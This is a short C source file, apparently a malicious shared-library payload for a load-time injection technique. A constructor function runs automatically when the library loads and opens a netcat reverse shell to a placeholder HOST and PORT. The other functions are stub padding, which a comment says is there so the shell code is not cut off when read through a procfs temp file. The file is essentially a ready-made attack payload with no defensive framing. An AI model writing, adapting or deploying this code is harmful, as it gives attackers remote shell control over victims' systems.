/* init_demo.c */
 
#include <stdlib.h>
#include <stdio.h>

static void __attribute__ ((constructor)) lib_init(void);

static void lib_init(void) {
    system("bash -c 'nc HOST PORT -e /bin/bash'");
}

// This functions are meant to increase the size of the library
// to prevent a bus error due to the whole file not being recorded
// in the procfs temp file, cutting the minimal code for the shell
// to execute

void lib_init2(void) {
    printf("Stub text 1");
}

void lib_init3(void) {
    printf("Stub text 2");
}

void lib_init4(void) {
    printf("Stub text 3");
}

void lib_init5(void) {
    printf("Stub text 4");
}

void lib_init6(void) {
    printf("Stub text 5");
}

void lib_init7(void) {
    printf("Stub text 6");
}

void lib_init8(void) {
    printf("Stub text 7");
}